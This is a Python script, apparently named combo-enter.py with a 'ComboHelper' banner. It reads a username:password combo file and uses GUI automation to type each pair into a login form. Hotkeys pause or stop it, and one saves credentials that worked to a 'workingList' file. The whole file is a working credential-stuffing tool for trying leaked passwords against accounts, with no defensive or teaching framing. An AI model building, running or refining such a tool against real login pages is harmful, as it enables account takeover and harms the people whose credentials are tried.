import sys
import time
import pyautogui
import keyboard
import os

paused = False
last_pause_time = 0
last_username = ""
last_password = ""

def main():
    if len(sys.argv) != 2:
        print("Usage: python combo-enter.py input_file.txt")
        sys.exit(1)

    input_file = sys.argv[1]

    try:
        welcome_message = """
*********************************************************************
*       (                    )       ( /(       (                   *  
*   )\           )    ( /(       )\())   (  )\          (   (       *
* (((_)   (     (     )\())  (  ((_)\   ))\((_)`  )    ))\  )(      *
* )\___   )\    )\  '((_)\   )\  _((_) /((_)_  /(/(   /((_)(()\     *
*((/ __| ((_) _((_)) | |(_) ((_)| || |(_)) | |((_)_\ (_))   ((_)    *
* | (__ / _ \| '  \()| '_ \/ _ \| __ |/ -_)| || '_ \)/ -_) | '_|    *
*  \___|\___/|_|_|_| |_.__/\___/|_||_|\___||_|| .__/ \___| |_|      *
*                                             |_|                   *
*********************************************************************
        """
        print(welcome_message)
        print("Click Home to pause the script and Home again to unpause. End to kill the script. Insert to log the last credentials.")
        print("Click on the username box within the next 10 seconds.")
        for i in range(10, 0, -1):
            print(f"Starting in {i} seconds...")
            time.sleep(1)

        with open(input_file, 'r') as infile:
            for line in infile:
                username, password = line.strip().split(':')

                check_for_pause()

                if not paused:
                    pyautogui.write(username)
                    pyautogui.press("tab")
                    pyautogui.press('enter')
                    time.sleep(4)
                    pyautogui.write(password)
                    pyautogui.press('tab')
                    pyautogui.press('enter')
                    last_username = username
                    last_password = password
                    time.sleep(3)
                else:
                    print("Script is paused. Press 'Home' again to resume.")
                    time.sleep(5)

                if keyboard.is_pressed('End'):
                    print("Script terminated by user (End pressed).")
                    sys.exit(0)

                if keyboard.is_pressed('Insert'):
                    log_last_credentials(last_username, last_password)
                    print("credentials logged!")

        print("Automation completed.")

    except FileNotFoundError:
        print(f"Error: The input file '{input_file}' does not exist.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def check_for_pause():
    global paused
    global last_pause_time
    current_time = time.time()
    if keyboard.is_pressed('Home'):
        if current_time - last_pause_time >= 10:
            if not paused:
                print("Paused. Press 'Home' again to resume.")
            else:
                print("Resumed.")
            paused = not paused
            last_pause_time = current_time
        else:
            print(f"Pause/unpause is locked for {10 - (current_time - last_pause_time):.1f} seconds.")

def log_last_credentials(username, password):
    output_dir = os.path.join("outputs")
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, "workingList.txt")
    
    with open(output_file, 'a') as logfile:
        logfile.write(f"{username}:{password}\n")

if __name__ == "__main__":
    main()
